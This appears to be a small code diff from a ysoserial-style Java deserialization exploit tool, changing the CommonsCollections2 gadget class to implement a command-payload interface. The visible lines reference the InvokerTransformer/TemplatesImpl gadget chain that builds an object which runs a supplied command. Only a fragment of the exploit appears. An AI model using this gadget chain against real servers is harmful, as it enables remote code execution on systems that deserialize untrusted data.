@@ -7,7 +7,7 @@ import com.h2tg.ysogate.utils.PayloadRunner;
 import org.apache.commons.collections4.comparators.TransformingComparator;
 import org.apache.commons.collections4.functors.InvokerTransformer;
 
-import com.h2tg.ysogate.payloads.ObjectPayload;
+import com.h2tg.ysogate.payloads.CommandObjectPayload;
 import com.h2tg.ysogate.annotation.Authors;
 import com.h2tg.ysogate.annotation.Dependencies;
 import com.h2tg.ysogate.utils.Gadgets;
@@ -28,7 +28,8 @@ import com.h2tg.ysogate.utils.Reflections;
 @SuppressWarnings({"rawtypes", "unchecked"})
 @Dependencies({"org.apache.commons:commons-collections4:4.0"})
 @Authors({Authors.FROHOFF})
-public class CommonsCollections2 implements ObjectPayload<Queue<Object>> {
+public class CommonsCollections2 implements CommandObjectPayload<Queue<Object>>
+{
 
 	public Queue<Object> getObject(final String command) throws Exception {
 		final Object                templates   = Gadgets.createTemplatesImpl(command);
